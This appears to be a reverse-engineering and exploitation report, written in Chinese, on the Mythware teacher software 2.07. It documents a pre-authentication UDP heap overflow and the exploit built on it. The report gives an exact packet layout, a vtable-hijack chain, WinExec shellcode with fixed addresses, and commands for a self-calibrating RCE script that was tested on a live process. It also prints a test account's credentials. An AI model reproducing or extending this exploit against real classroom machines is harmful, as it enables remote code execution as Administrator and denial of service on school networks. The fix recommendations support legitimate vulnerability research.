> 这是我当时写的分析报告，路径还是旧工作区的（`remote_rce_chain/`、`analysis/`）。脚本后来整理到 `exploit/` 了，短版漏洞/报文看 `docs/vulnerability.md`、`docs/protocol.md`。

# 极域电子教室教师端 2016（Mythware 2.07）静态逆向分析与远程溢出报告

## 1. 结论摘要

- 教师端主程序为 `TeacherMain.exe`（2.07.0.13488，x86，2016/2017 构建），网络协议栈主要位于：
  - `LibComLayer.dll`：UDP 接收线程、报文分发、事务/处理器管理；
  - `LibBaseTrans.dll`：事务与报文处理器（`CBlockPacketHandler`、`CNameTransaction` 等）；
  - `LibNET30.dll`：socket 封装。
- 默认教师端在 **UDP 4705** 上启动通信层，并注册了 `CCommandPacketHandler` 与 `CBlockPacketHandler`。
- 发现并**动态验证**了一个预认证、可远程触发的堆缓冲区溢出：
  - 位置：`CBlockRecverTransaction::ProcessBlock`（RVA `0xdcf0`，`LibBaseTrans.dll`）及其后续块路径 `OnReceiveComplete`（RVA `0xde90`）。
  - 根因：按报文中的 `total_size` 分配缓冲区，却用独立的 `data_len` 执行 `memcpy`，既不检查 `data_len <= 0x400`，也不检查 `index*0x400 + data_len <= total_size`。
  - 单包即可把 1 字节分配越界写入 1379 字节；数据完全可控。
- 进一步验证了控制流劫持链：
  1. 第一包创建持久块事务 A（大缓冲区）；
  2. 第二包创建事务 B，使其对象落在 A 的缓冲区之后；
  3. 第三包使用 A 的 GUID 和最后一个块索引，从 A 的缓冲区末尾越界写入，精确覆盖事务 B 的虚表指针；
  4. 触发 B 的虚调用后，**EIP = 0x41414141**，证明虚拟调用目标可被完全控制。
- 核心模块 `TeacherMain.exe`、`LibBaseTrans.dll`、`LibComLayer.dll`、`LibNET30.dll` 均**未启用 ASLR 和 DEP**（`DllCharacteristics = 0`），这显著降低了从控制流劫持到远程代码执行的难度。完整的远程 RCE 仍需确定目标侧稳定的假虚表/栈地址或固定模块 gadget；本报告给出可复现的本地验证和剩余步骤。

> 本文所有结论基于工作区中随附的已安装二进制；动态验证使用只加载 `LibComLayer.dll`/`LibBaseTrans.dll` 的最小驱动，直接调用真实 DLL 的导出函数，未启动完整教师端。

---

## 2. 目标与构建信息

| 文件 | SHA-256 | 版本 |
|---|---|---|
| `TeacherMain.exe` | `A4F101D55FB6A90297A6EBE490EACECA03ADB51CFB8CCB53014904FE81828834` | 2.07.0.13488 |
| `LibBaseTrans.dll` | `18EDCD00ABE9F2C66AE05222DFF3BB050F9B9D438510BD6EE30BEF590A98CEE5` | 2.07.0.13488 |
| `LibComLayer.dll` | `9AD10B9FDB0AE27C2E2A3099BE6B5533EE65CAF16A146A119837104C6D365FE2` | 2.07.0.13488 |
| `LibNET30.dll` | `B121EA9346AD57024D51EEE7C57075A86ACF5F969F70B1EC6D681D10FF39EBB8` | 1.07.0.3532 |

缓解措施（PE `DllCharacteristics`）：

- `TeacherMain.exe` / `LibBaseTrans.dll` / `LibComLayer.dll` / `LibNET30.dll`：`0x0`，即 **无 DYNAMICBASE、无 NXCOMPAT**。
- `LibBaseTrans.dll`、`LibComLayer.dll` 等仍启用了栈 GS cookie（`__security_check_cookie`），但本漏洞是堆溢出，不受 GS 保护。

---

## 3. 网络协议与预认证攻击面

### 3.1 端口

`TeacherMain.exe` 初始化通信层时调用 `ICommunicationLayer::Start(local_ip, multicast_or_broadcast_addr, port)`，端口来自全局变量 `DAT_006ec02c`。静态读取得到：

```
0x6ec028: 05 00 00 00 61 12 00 00
```

其中 `0x6ec02c = 0x1261 = 4705`。`TeacherMain` 同时注册：

- `CCommandPacketHandler`（magic `0x434F4D44`）
- `CBlockPacketHandler`（magic `0x424C434B`）

注册位置：`TeacherMain.exe` RVA `0x54a0f0` 的 `FUN_0054a0f0`。

### 3.2 UDP 接收与分发

`LibComLayer.dll` 的接收线程 `FUN_10002980`：

- 栈缓冲区 `auStack_5b0[0x5a0]`（1440 字节）；
- `CUDPSocket::Receive(..., buf, 0x5a0, &len, &src)`；
- 若源 IP 等于本机 IP 或为 0，则丢弃；否则调用 `FUN_10002180(comm, buf, len)`。

`FUN_10002180` 的报文头校验：

```c
if (len < 0x1c) return 0;
if (*(uint*)(buf+4) != 0x00010000) return 0;
if (len < *(uint*)(buf+8) + 0x1c) return 0;
// 先按 buf+0xc 的 16 字节 GUID 查找事务；
// 找不到事务时，用 *(uint*)buf（magic）查找已注册报文处理器；
// 调用 handler->ProcessPacket(buf, len)。
```

因此，任意局域网主机只要发往教师端 IP:4705，且源 IP 不是教师本机，就可进入报文处理器。

---

## 4. 漏洞 1：块接收事务堆溢出（预认证）

### 4.1 入口与检查

`CBlockPacketHandler::ProcessPacket`（`LibBaseTrans.dll` RVA `0x1560`）：

```c
if (len > 0x1b &&
    *(uint*)pkt == 0x424C434B &&
    len > 0x3c &&
    *(uint*)(pkt+0x38) + 0x3d <= len) {

    ip = communication_layer->GetLocalIpAddress();   // vtable +0x14
    if (*(uint*)(pkt+0x24) == ip) {                  // 本机 IP，不是秘密
        tx = new CBlockRecverTransaction(comm, (GUID*)(pkt+0xc));
        tx->ProcessBlock((tagPACKET_BLOCK*)(pkt+0x1c));
        tx->Release();
    }
}
```

- 无会话、无认证、无 GUID 预注册要求；GUID 由报文自带。
- `pkt+0x24` 只要求等于教师端本机 IP；攻击者发往该 IP，天然知道该值。
- magic 在内存中的小端 dword 为 `0x424C434B`，线路字节为 `4B 43 4C 42`。

### 4.2 溢出点

`CBlockRecverTransaction::ProcessBlock`（RVA `0xdcf0`）反汇编核心：

```c
total_size = *(uint*)(packet + 0x10);       // 报文 +0x2c
blocks     = (total_size + 0x3ff) >> 10;    // 每块 1024 字节
buf        = malloc(total_size);            // [this+0x28]
bitmap     = malloc(blocks);                // [this+0x2c]
memset(bitmap, 0, blocks);

if (*(uint*)packet == 1) {                  // 报文 +0x1c，块数据
    index = *(int*)(packet + 0x14);         // 报文 +0x30
    if (index >= blocks) goto fail;         // 只检查索引
    memcpy(buf + index*0x400, packet + 0x20, *(uint*)(packet + 0x1c));
    //     ^ 报文 +0x3c            ^ 报文 +0x38 = data_len
    bitmap[index] = 1;
}
```

缺失的校验：

- `data_len <= 0x400`；
- `index*0x400 + data_len <= total_size`。

`OnReceiveComplete`（RVA `0xde90`）对已存在的同一 GUID 事务再次处理块数据时，同样只检查 `index < blocks` 和 `bitmap[index] == 0`，然后执行同样的 `memcpy`，同样缺少上述边界检查。

### 4.3 单包触发报文（可直接造成 1378 字节堆溢出）

UDP 总长 1440 字节（接收缓冲区上限），发往教师端 `IP:4705`：

| 偏移 | 长度 | 值/说明 |
|---|---:|---|
| `0x00` | 4 | `0x424C434B`（线路字节 `4B 43 4C 42`） |
| `0x04` | 4 | `0x00010000` |
| `0x08` | 4 | `1412`（`0x1c + 1412 = 1440`，通过通信层长度检查） |
| `0x0c` | 16 | 任意 GUID（不与现有事务冲突） |
| `0x1c` | 4 | `1`（块数据类型） |
| `0x20` | 4 | `0` |
| `0x24` | 4 | 教师端本机 IP（网络序，直接写点分 IP 的 4 字节） |
| `0x28` | 4 | `0` |
| `0x2c` | 4 | `1`（`total_size`，只分配 1 字节） |
| `0x30` | 4 | `0`（块索引） |
| `0x34` | 4 | `0` |
| `0x38` | 4 | `1379`（`1379 + 0x3d = 1440`，通过处理器长度检查） |
| `0x3c` | 1380 | 1379 字节可控数据 + 1 字节填充 |

结果：`malloc(1)` 后复制 1379 字节，越界写入 1378 字节。

### 4.4 动态验证

使用最小驱动加载真实的 `LibComLayer.dll` 与 `LibBaseTrans.dll`，构造真实 `CBlockPacketHandler` 对象并调用其导出的 `ProcessPacket`：

- 默认报文（magic `0x424C434B`、IP 字段 `127.0.0.1`）：创建事务，`ProcessBlock` 返回 1，1 字节分配的 `B+0x10` 处出现我们写入的标记，块位图被置 1。
- 错误 magic（`0x4B434C42`）：不创建事务，无任何复制。
- IP 字段为 0：不创建事务。
- 这证明 magic 字节序、IP 校验和长度字段均按上述布局工作。

在二阶段测试中：

```
TA=0x0385d000  TB=0x0385d660  B_A=0x0385d058
dest=0x0385d458  TB-dest=520
```

第三包通过通信层分发器（GUID A）进入已保留事务 A 的 `OnReceiveComplete`，从 `B_A+0x400` 复制 524 字节，覆盖位于 `+520` 的事务 B 的虚表指针。随后触发 B 的虚拟析构：

```
after ORC TBvt=013ff774 (hijacked=1)
UNHANDLED code=c0000005 addr=41414141 eip=41414141
```

即虚拟调用目标被完全控制。

---

## 5. 从溢出到远程 RCE

### 5.1 已验证的链

1. **包 A**：GUID A，类型 3（只分配、不写数据、不置位图），`total_size = 0x600`。
   - 创建事务 A，分配 `B_A(0x600)`、位图；`Release` 后事务 A 仍被事务管理器保留（可通过管理器按 GUID 查到）。
2. **包 B**：GUID B，类型 3，`total_size = 0x50`。
   - 创建事务 B，其对象 `T_B` 落在 `B_A` 之后（本验证中相对偏移 520）。
3. **包 2（GUID A）**：类型 1，`total_size = 0x600`，块索引 1，`data_len = 524`。
   - 通信层按 GUID A 找到仍存在的事务 A，调用 `OnReceiveComplete`；
   - 从 `B_A + 0x400` 复制 524 字节，越过 `B_A` 末尾，精确覆盖 `T_B` 的虚表指针（4 字节）；
   - 由于 `bytes_received (524) < total_size (1536)`，不会触发 `SendBlockRet`，避免额外干扰。
4. **触发虚调用**：
   - 向事务 B 发送同 GUID 的报文，通信层会调用 `T_B->OnReceiveComplete`（虚表 +0xc）；
   - 或在事务清理/析构时触发虚析构（虚表 +0）；
   - 虚拟调用目标 = `[fake_vtable + slot]`，由攻击者控制。

本验证把假虚表放在本地栈上的报文缓冲区，条目写 `0x41414141`，最终 `EIP=0x41414141`。

### 5.2 远程 RCE 的剩余条件

> 说明：本节记录当时的剩余条件；真实教师端上的最终链、测量值和 Notepad RCE 结果见 **8.5**。

已具备：

- 预认证 UDP 入口，端口 4705，报文格式与校验均已确认；
- 完全可控的越界写长度和内容；
- 事务持久化与二阶段写，避免一次性堆破坏；
- 目标进程核心模块无 ASLR、无 DEP；
- 可覆盖相邻 C++ 对象的虚表并获得 EIP 控制。

还需在真实教师端上确定：

1. **假虚表的稳定地址**：
   - 假虚表可放在后续报文数据中（位于接收线程栈上的 1440 字节缓冲区），或堆上的溢出缓冲区；
   - 目标进程未启用 ASLR，栈/堆地址可能跨运行稳定；需要在真实 `TeacherMain.exe` 进程中测量一次基址。
2. **目标函数/gadget**：
   - 由于核心模块无 DEP，可考虑栈上 shellcode；若系统策略强制 DEP，则使用固定模块 ROP；
   - 虚调用 `T_B->OnReceiveComplete(packet, len)` 会把 `packet` 作为第一个栈参数传入，适合寻找 `mov eax,[esp+4]; add eax,0x3c; jmp eax` 一类跳板，跳到 `packet+0x3c` 的块数据。
3. **堆布局稳定性**：
   - 事务 A/B 的分配顺序与大小已可控；实测 `T_B - (B_A+0x400) = 520`，可在真实进程中用相同序列校准；
   - 若偏移变化，可调整块索引和 `data_len` 覆盖目标虚表。

### 5.3 影响

- 单包即可造成教师端进程堆破坏；本机实测中，连续 50 个不同 GUID 的单包使 `TeacherMain.exe` 退出（ntdll 堆管理路径 `c0000005`，FaultTolerantHeap 事件）。远程 DoS 已确认。
- 完整链可在教师端进程内劫持虚拟调用并控制 EIP；结合无 ASLR/DEP 的核心模块，具备远程代码执行条件。
- 触发者只需能向教师端 UDP 4705 发包，无需学生端登录、无需有效会话或 GUID 预注册。

---

## 6. 其他漏洞候选

### 6.1 学生改名/名称堆溢出（需成员上下文）

`CNameTransaction::OnReceiveComplete`（RVA `0x7bb0`）：

- magic `0x524E5251`（线路字节 `51 52 4E 52`）；
- 报文 `+0x22` 为名称长度，`+0x26` 起为 UTF-16 名称；
- 成员对象由 `malloc(0x50)` 分配，名称区从 `+0x10` 开始，仅 0x40 字节（32 个 wchar）；
- 改名路径在长度字段大于已有长度时，按 NUL 结尾直接复制到 `+0x10`，无上限 → 堆溢出。

### 6.2 文件提交文件名堆溢出（需提交功能开启）

`CSubmitFileTransaction::ProcessRequest`（RVA `0x1e60`）：

- 文件名从报文 `+0x20` 起按 NUL 结尾复制到 `malloc(0x60)+0x14`；
- 随后复制到 0x270 字节报文缓冲区的 `+0x20` 和 `+0x60`；
- 均未按目标容量限制。

### 6.3 文件接收路径栈溢出（GS 保护）

`LibFileRecv.dll` 的 `FUN_1000e4d0` / `FUN_10006110`：

- 栈缓冲区 0x208 字节；
- 以路径中反斜杠索引 `i` 作为 `wcsncpy(dst, src, i+1)` 的长度；
- 路径中第 260 个字符之后出现反斜杠即越界；
- 函数末尾有 `__security_check_cookie`，直接覆盖返回地址会触发 GS 失败；远程可达性尚未证明（更可能来自本地/文件接收上下文）。

### 6.4 预认证命令通道

`CCommandPacketHandler::ProcessPacket`（RVA `0x1240`）：

- magic `0x434F4D44`（线路字节 `44 4D 4F 43`）；
- 无 IP 校验、无 GUID/会话校验；
- 将命令数据传递给 `CPassiveCommandTransaction::ProcesssCommand`，最终在 `TeacherMain.exe` 的 `FUN_0055ec50` 中按命令码分派（事件 `0x80000010`）；
- 已定位命令码 `0x200`、`0x200000`、`0x20000000`、`0x800000`、`0x1` 的分派目标；未完成全部子处理函数的审计，建议继续检查 `FUN_0055c970`、`FUN_0044ee30`、`VRServer_ProcessCmd` 等的字符串/长度处理。

---

## 7. 修复建议

1. `CBlockRecverTransaction::ProcessBlock` / `OnReceiveComplete`：
   - 校验 `total_size` 上界（如 ≤ 16 MB）；
   - 强制 `data_len <= 0x400`；
   - 强制 `index < blocks` 且 `(size_t)index*0x400 + data_len <= total_size`；
   - 对 `total_size` 与块数使用无符号安全运算。
2. `CNameTransaction`：成员名称按固定 32 wchar 截断，或按长度动态扩容；复制前检查源报文边界与 NUL 终止。
3. `CSubmitFileTransaction`：文件名/路径按目标缓冲区容量截断，校验 `data_len`。
4. `LibFileRecv`：使用 `wcsncpy_s`/显式长度检查，避免以路径分隔符索引作为复制长度。
5. 协议层：为块/命令报文增加会话认证或至少源 GUID 校验；不要仅依赖本机 IP 字段。
6. 构建：为核心模块启用 ASLR/DEP/CFG，减少控制流劫持后的利用面。

---

## 8. 证据与复现

### 8.1 关键 REA Evidence ID

| 主题 | Evidence ID |
|---|---|
| UDP 端口 4705 数据 | `ev_a2034c4f82b47c6c3da2ece82759cc9c1149ba9927d50a36d8fe72a41c4a5987` |
| 教师端初始化/注册处理器/Start | `ev_d434df548e3f35d0c7f18d0c13becde1ae0e7a15b911f7e05e78f31824db137a` |
| LibComLayer 接收线程（1440 字节栈缓冲） | `ev_88d72252ec1dccb69682ce47da37b2be092647d6d9840defdecc6ddf4b6bacea` |
| 通信层分发与头部校验 | `ev_60a2ff663028c67c21e2a31d9f6d967747438ef3de50f054296449ca1d6a6936` |
| CBlockPacketHandler::ProcessPacket | `ev_40234b083cacc3d544e33fa208a1f13703fb96030af04ad8555cb0d646d2ec08` |
| ProcessBlock / ProcessRequest 溢出 | `ev_85948ef71be1f149eb8786ab1845c21fd5a5e5a20ee065bee6601d1546b81bd7` |
| 二阶段 OnReceiveComplete 溢出 | `ev_6d1f66dd1ec992b3f994fb6b7a7a5ea2a02c24e7c97a69dff3ba5655daaeb296` |
| CTransactionHandler 构造/GUID/管理器 | `ev_2b4bee9267c451f40807fc8df68b2221077943a1f47cb14813907fa0c98c89cc` |
| CBlockRecverTransaction 虚表 | `ev_7055b49a48f820932816b58abb33ee4b9f7831072db7cffc3ba8f6e9612be63e` |
| 构造/析构与 free 字段 | `ev_a7e569eb893d78188058322920b78f765c794bfb6ef610f5062a45f225965968` |
| 命令事件 0x80000010 处理器 | `ev_14602b0197534ac2e8e30932b9622eb24d22ff0a6bfab51b3f9eb09e2475771b` |
| 学生改名溢出 | `ev_de6adc2f1bb8f6a2f358b756e313f570afd7ea26a01a4e7038a9cd867e3caca7` |
| AddClient 0x50 缓冲区 | `ev_2c6a5d002b072972d69b2ba2aa1096422e34e67073afc7a8e0a9a95d2fe620dc` |
| LibFileRecv 栈溢出 | `ev_ebc685fa1a519722df775747ec8f94e0350f437e4a315ba7e5d9d167bf179360` |

### 8.2 复现文件

- `analysis/mythware_poc.py`：UDP 报文构造与发送脚本（单包溢出 + 三包控制流劫持模板）。
- `analysis/npcap_inject_poc.py`：Npcap L2 注入器，用于教师端绑定在 Hyper-V/虚拟地址、普通路由不可达时伪造源 IP 投递报文。
- `analysis/block_harness.cpp`：本地验证驱动源码（加载真实 DLL，调用真实处理器/分发器，验证溢出、事务持久化、虚表覆盖与 EIP 控制）。

### 8.3 动态验证摘要

```
comm=037e7c00 handler=016c47b0 mgr=037ecd80
after A: txA=037ed000
B_A=037ed058 total=1536 blocks=2 bytes=0
after B: txB=037ed660 vt=036065a8
dest=037ed458 delta=520 len=524
calling dispatcher with GUID A
after dispatch TBvt=0143ebdc hijacked=1 bytes=524
UEF TBvt=0143ebdc
UNHANDLED code=c0000005 addr=41414141 eip=41414141
```

### 8.4 真实教师端复测（2026-10-20）

本机 `TeacherMain.exe`（PID 15876）实际绑定：

```
LocalAddress LocalPort OwningProcess
172.27.144.1     4705         15876
```

即绑定在 Hyper-V 虚拟网卡 `172.27.144.1`，而不是 WLAN 的 `10.16.74.105`。从另一台电脑发往 WLAN 地址的报文不会到达该 socket；本机直接绑定 WLAN 源地址发往 172.27.144.1 也被 Windows 协议栈拒绝（实测超时）。因此改用 Npcap 在 Hyper-V 适配器上注入以太网帧，伪造源 IP `172.27.144.200`：

- 1 个单包：教师端未立即退出（堆已破坏，但未马上触发）。
- 连续 50 个不同 GUID 的单包：教师端进程退出。
- Windows 应用程序日志：

```
错误应用程序名称: TeacherMain.exe，版本: 2.7.0.13488
错误模块名称: ntdll.dll，版本: 10.0.19041.3996
异常代码: 0xc0000005
错误偏移量: 0x00048255
```

同时出现 FaultTolerantHeap（`ffffbaad`）事件，符合堆破坏。教师端已重新启动（新 PID 7192，仍绑定 172.27.144.1:4705）。

复测命令（本机 Hyper-V 绑定场景，需要 Npcap）：

```cmd
F:\Python39\python.exe F:\Program\Mythware\analysis\npcap_inject_poc.py --count 50
```

若教师端改绑到可达的 LAN IP，则可直接在另一台电脑上使用：

```cmd
python mythware_poc.py <教师端绑定IP> --count 50
```

### 8.5 真实教师端远程代码执行（2026-10-20，Notepad 里程碑）

教师端重启后停在“系统登录”窗口，通信层未启动。为恢复运行状态，创建了临时本地教师账号 `rce_test`（密码 `RceTest#2026`，仅本机实验使用，测试后应删除或改密）。登录后：

```
TeacherMain.exe PID 12980
UDP 172.27.144.1:4705
LibComLayer.dll   base 0x029a0000
LibBaseTrans.dll  base 0x029c0000
```

#### 8.5.1 真实堆布局与旧链的修正

在真实进程中用 cdb 在 `CBlockPacketHandler` 的分配点（`LibBaseTrans+0xdd65`）抓取：

| 包 | handler | 缓冲区 |
|---|---|---|
| A（GUID 0xC0，type=3，total=0x600） | `0x0465c800` | `0x0e0aaf90` |
| B（GUID 0xD1，type=3，total=0x50） | `0x0465c908` | `0x0465c8b0` |

关键差异：A 的 0x600 大缓冲区被分配到另一个堆段（`0x0e0a...`），与 B 的 handler（`0x0465...`）相距极远，**旧的三包 A→B 覆盖链在真实进程中不可用**。但 B 的 0x50 缓冲区恰好紧邻它自己的 handler：

```
B_B = 0x0465c8b0
H_B = 0x0465c908
H_B - B_B = 0x58
B_B+0x50: 堆块头 dd 51 5d 77 00 69 01 8c
H_B+0x00: 原 vtable 0x029e65a8 (LibBaseTrans+0x265a8)
H_B+0x04: 引用计数 1
H_B+0x28: B_B
```

因此改成**自溢出**：对同一个 GUID B 再发一个 type=1 数据包，`OnReceiveComplete` 直接 `memcpy(B_B, data, data_len)`，不需要 `ProcessBlock` 重新分配。`data_len=0x5c` 刚好覆盖 `B_B+0x58` 的 H_B 虚表指针，同时保留 `+0x50..0x57` 的堆块头，H_B 的引用计数和业务字段不动。

#### 8.5.2 利用链

1. `measure` 模式创建 GUID A（0xC0）和 GUID B（0xD1）两个 type=3 handler；只分配，不关闭。此时 H_B 的 `[H_B+0x30]=0`、位图字节为 0，后续数据包可以进入拷贝路径。
2. 对 GUID B 发送 type=1、`total=0x50`、`index=0`、`data_len=0x5c` 的溢出包：
   - `OnReceiveComplete` 检查 magic/长度后，`memcpy(B_B + 0, packet+0x3c, 0x5c)`；
   - 数据偏移 `0x00..0x3f` 为假虚表，`0x50..0x57` 为原堆块头，`0x58..0x5b` 为 `B_B`；
   - H_B 的虚表指针变为 `B_B`；
   - 拷贝后 `bytes_received(0x5c) >= total(0x50)`，调用 finish 发送块确认；finish 只使用 `[H_B+0x8]` 的连接对象，不触碰 H_B 虚表，因此不会提前触发。
3. 对 GUID B 发送触发包：
   - 头部不是标准 magic，而是 `EB 1A 90 90`：`jmp +0x1a` 跳到 `+0x1c`；
   - `+0x04` 仍为 `0x00010000`、`+0x08` 为 0，满足通信层长度检查；
   - `+0x0c` 为 GUID B，使分发器找到 H_B；
   - `+0x1c` 为 shellcode，`+0x300` 为 `notepad.exe\0`。
4. 分发器执行：

```
MOV EDX,[EDI]        ; H_B->vtable = B_B
MOV EAX,[EDX+0xc]    ; fake OnReceiveComplete = jmp esi
PUSH EBP             ; len
PUSH ESI             ; packet
MOV ECX,EDI          ; this = H_B
CALL EAX             ; jmp esi -> packet+0 -> +0x1c
```

此时 `ESI = packet`、`EDI = ECX = H_B`、`EBP = len`。shellcode：

```
pushad
mov eax, esi
add eax, 0x300
push 1
push eax
call dword ptr [0x0066731c]   ; kernel32!WinExec
popad
ret 8
```

`pushad/popad` 保护 EDI（分发器返回后还要用 EDI 调 Release），`ret 8` 清理两个栈参数。WinExec 的 IAT 地址固定（TeacherMain.exe 无 ASLR），`jmp esi` 跳板为 `0x0043d21d`。

假虚表（位于 B_B）：

| 槽位 | 值 | 用途 |
|---|---|---|
| +0x00 | `0x00449f92` (`ret 4`) | 析构/释放保护 |
| +0x04 | `0x00449f92` | 超时等单参数虚调用 |
| +0x08 | `0x00410bba` (`ret 8`) | 双参数虚调用 |
| +0x0c | `0x0043d21d` (`jmp esi`) | 触发 OnReceiveComplete |
| +0x10.. | `0x00449f92` | 兜底 |

#### 8.5.3 结果

```
notepad.exe      PID 15844  C:\Windows\SysWOW64\notepad.exe
TeacherMain.exe  PID 12980  alive / responding
```

记事本窗口“无标题 - 记事本”在前台显示；约 95 秒后复查教师端仍在运行，Windows Application 日志中没有新的 TeacherMain.exe 事件 1000（Application Error）。短时稳定性通过。

复现命令（当前进程，参数已按上面的测量值校准）：

```cmd
F:\Python39\python.exe F:\Program\Mythware\analysis\npcap_inject_poc.py ^
  --mode exploit --guid-seed 0xD1 --delta 88 ^
  --bb 0x0465c8b0 --heap-header dd515d770069018c
```

#### 8.5.4 重启后的重新校准

`B_B`、堆块头和模块基址都随进程/堆状态变化，重启教师端后需要重新校准：

1. 登录教师端，确认 `netstat -ano -p UDP | findstr 4705` 显示 `172.27.144.1:4705`。
2. 运行 `--mode measure` 创建 GUID A/B（0xC0/0xD1）。
3. 用 cdb 附加（**必须用 `qd` 分离，`q` 会终止被调试进程**），在 `LibBaseTrans+0xdd65` 断点记录两次分配的 `esi`（handler）和 `eax`（buffer）；第二次的 `eax` 即 `B_B`，`esi` 即 `H_B`，`delta = H_B - B_B`。
4. 读取 `B_B + delta - 8` 的 8 字节堆块头，填入 `--heap-header`；`--bb` 填 `B_B`；`--guid-seed` 填创建 B 时使用的种子（默认 0xD1）。
5. 运行 `--mode exploit`。

#### 8.5.5 限制

- 当前是**一次性**利用：H_B 的虚表指向 B_B 中的假表，之后再向同一 GUID B 发包会再次命中 `jmp esi`，若报文头部不是同样的跳转布局就会崩溃；测试后不要复用该 GUID。
- 假表位于块缓冲区，H_B 被释放/超时后该地址失效；长期驻留需要把假表放到稳定的堆块，或恢复原虚表。
- 地址、堆块头、`B_B→H_B` 偏移是进程相关的，不能直接跨重启复用；需要按 8.5.4 重新校准。要实现“通用 PoC”，需要自动堆 grooming/地址测量，或寻找不依赖堆布局的固定目标。
- 当前 shellcode 只执行 `WinExec("notepad.exe", 1)` 作为非破坏性演示；控制流原语已可执行任意命令。若继续做反向 shell/持久化，应替换 shellcode 载荷并考虑教师端重启后的稳定性。

### 8.6 稳定、自校准的最终 PoC（2026-10-20）

8.5 的链需要手工测量 B_B/H_B/堆块头，且假虚表不恢复，长时间运行可能出问题。最终版把这些全部自动化，并修正了 handler 生命周期：

#### 8.6.1 关键修正

1. **引用计数**：真实 dispatcher 的 lookup 不再额外 AddRef；如果 handler 的 `[H+4]` 为 1，溢出包分发后的 `Release` 会把它减到 0，随后 lookup 返回 0，触发包找不到 handler。溢出数据把 `[H+4]` 写成 **2**，`Release` 后剩 1，handler 留在 map 中。
2. **避免 finish**：溢出数据把 `[H+0x1c]`（total）写成 `0xFFFFFFFF`，使 `received < total`，不调用 finish/关闭路径。shellcode 在触发后再把 total 恢复为 `0x50`。
3. **保留中间堆区域**：溢出从 B 一直写到 H+0x1f；在 B+0x50 到 H-8 之间可能还有其他 chunk/对象。PoC 用 `ReadProcessMemory` 读出这段原始字节并原样写回，只修改 B 的缓冲区内容、H 的 vtable/refcount/total，避免破坏堆。
4. **shellcode 放在 B 的 0x50 缓冲区内**：
   - `B+0x00..0x0f`：fake vtable，槽 +0xc = `B+0x10`；
   - `B+0x10..0x38`：41 字节 shellcode；
   - 不需要 `jmp esi` 或其他 gadget，vtable 槽直接指向 B 中的 shellcode。
5. **标准触发包**：接收层要求标准头部（magic `0x424C434B`、version `0x00010000`、payload length 1412，以及 `+0x24` 教师本机 IP）。自制 `EB 1A`/短跳转触发包会被丢弃；最终使用 `build_packet` 生成完全标准的包，只在 `+0x300` 放 `notepad.exe\0`。触发包本身不被执行，只用于让 dispatcher 按 GUID 找到 H 并调用 B+0x10。
6. **恢复 vtable 与 total**：shellcode 先 `mov [H], LibBaseTrans_base+0x265a8`、`mov [H+0x1c], 0x50`，再 `WinExec`。触发分发后的 `Release` 看到原 vtable，正常析构，不再留下 fake vtable。

#### 8.6.2 自动 PoC

文件：`analysis/mythware_auto_rce.py`

它在本机以管理员运行，自动完成：

- 找 `TeacherMain.exe` PID，确认 UDP 4705 已监听；
- Toolhelp 取 `LibBaseTrans.dll` 基址和 vtable 地址；
- 发包创建 A（0x600）和 B（0x50），用 `ReadProcessMemory` 扫描新增的 0x50 handler，计算 `H`、`B`、`delta`、堆块头；
- 选择 delta 最小（优先 ≤0x100）的候选，读中间堆区域；
- 生成 inline shellcode、发送溢出包、发送标准触发包；
- 检查 H vtable 是否恢复、`notepad.exe`/`TeacherMain.exe` 是否存活。

用法（教师端已登录、4705 监听、管理员权限）：

```cmd
F:\Python39\python.exe F:\Program\Mythware\analysis\mythware_auto_rce.py
```

可选参数：

```cmd
--target 172.27.144.1   --port 4705
--attempts 30           --calibrate-only
--pid <PID>             --device/--host-mac/--spoof-src
```

`--calibrate-only` 只自动找到受害者并打印 H/B/delta/header/GUID，不发溢出。

#### 8.6.3 实测结果

全新教师端进程（重启后重新登录）：

```
TeacherMain PID 6972
LibBaseTrans base=0x29a0000  vftable=0x29c65a8
第一次运行:
  H=0x462cac0 B=0x462ca10 delta=0xb0 mid=0x58
  H vtable restored: True
  notepad.exe PID 5524
第二次运行（不重启、不手工测量）:
  H=0x4624da0 B=0x4624d48 delta=0x58 mid=0x0
  H vtable restored: True
  notepad.exe PID 10488
TeacherMain PID 6972 两次运行后仍存活
70 秒复查:
  TeacherMain 6972 Responding
  notepad 5524 / 10488 均存活
  Application 日志无 TeacherMain 事件 1000
```

两次连续运行都无需 cdb、无需手工地址；第二次自动选中了最干净的 `delta=0x58` 布局（H 紧邻 B 之后），70 秒后教师端仍稳定。

#### 8.6.4 限制

- 这是**本机自校准** PoC：它需要教师端主机上的管理员权限来 `ReadProcessMemory`。漏洞触发本身仍是远程 UDP 4705 报文；但“完全远程、无本地权限、无信息泄漏”的 PoC 仍需一个信息泄漏或固定堆布局，当前未实现。
- 自动选中的 handler/地址是进程相关的；脚本每次运行都会重新扫描，不依赖历史值。
- 当前 payload 是非破坏性的 `WinExec("notepad.exe",1)`；替换 shellcode 中的命令即可执行任意命令。反向 shell/持久化未实现。
- 测试使用临时教师账号 `rce_test` / `RceTest#2026`；测试后应删除或改密。

---

## 9. 限制与后续

- 已完成真实进程的远程代码执行里程碑，并做成**可重复、自校准、恢复 vtable** 的 PoC：Npcap L2 注入 → 块缓冲区自溢出 → H_B 虚表劫持 → B 缓冲区 inline shellcode → `WinExec("notepad.exe")`；两次连续运行教师端均未崩溃。
- 仍需“纯远程”通用化：去掉本机 `ReadProcessMemory` 校准，或通过信息泄漏/固定堆布局获得 B/H；当前自动 PoC 需要教师端主机管理员权限。
- 后渗透/反向 shell、权限维持、横向移动未继续实现；当前教师端以 Administrator 运行，代码执行上下文即为管理员。
- `TeacherMain.exe` 的堆/栈地址跨重启会变化（尽管模块 ASLR/DEP 关闭）；自动 PoC 每次运行重新扫描，不依赖固定地址。
- 命令通道、文件提交、改名路径的完整利用链未继续武器化。

---

## 10. “完全远程、无本地权限、无信息泄漏”阶段（2026-10-20）

目标：在不读取教师端进程内存、不使用 cdb/ReadProcessMemory 的前提下，仅通过 UDP 报文完成 RCE。

### 10.1 已排除的纯远程执行路径

- 命令通道（magic `0x434F4D44`，预认证）：
  - 命令码 1 → `FUN_004c03f0` → `FUN_005776a0`，仅更新报表列表/学生信息；`FUN_004c0180` 的 `WinExec` 是教师双击报表项时的本地打开逻辑，不能由报文直接触发。
  - 命令码 `0x200`/`0x200000`/`0x800000`/`0x20000000` 等分派均为 UI/VR/远程控制对象，未发现报文到 `CreateProcessW`/`ShellExecuteW` 的直接路径。
